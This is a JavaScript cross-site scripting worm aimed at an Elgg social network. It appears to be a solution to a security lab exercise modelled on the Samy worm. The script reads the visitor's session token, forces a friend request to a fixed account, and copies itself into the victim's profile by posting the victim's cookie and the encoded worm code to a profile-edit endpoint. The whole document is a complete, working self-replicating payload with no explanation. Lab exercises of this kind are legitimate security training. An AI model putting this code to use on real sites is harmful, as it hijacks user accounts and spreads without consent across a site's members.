<script id = "worm" type= "text/javascript">
    window.onload = function () {
        var userName = elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        //worm stuff
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var strCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + strCode + tailTag);
        //alert(strCode);

        var desc = "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2";
        
        var content = token + ts + "&name=" + userName + desc;
        var sendurl = "http://ec2-54-209-105-64.compute-1.amazonaws.com/action/profile/edit";
        var samyGuid = 47;

        if (elgg.session.user.guid != samyGuid) 
            {
            var Ajax = null;
            //add friend
            var friendurl = "http://ec2-54-209-105-64.compute-1.amazonaws.com/action/friends/add?friend=47" + ts + token;
            Ajax = new XMLHttpRequest();
            Ajax.open("GET", friendurl, true);
            Ajax.setRequestHeader("Host", "ec2-54-209-105-64.compute-1.amazonaws.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send();

            //propogate worm
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "ec2-54-209-105-64.compute-1.amazonaws.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.setRequestHeader("Cookie", document.cookie);
            Ajax.setRequestHeader("Referer", "http://ec2-54-209-105-64.compute-1.amazonaws.com/profile/"+userName+"/edit");
            Ajax.send(content);
            }
}
</script>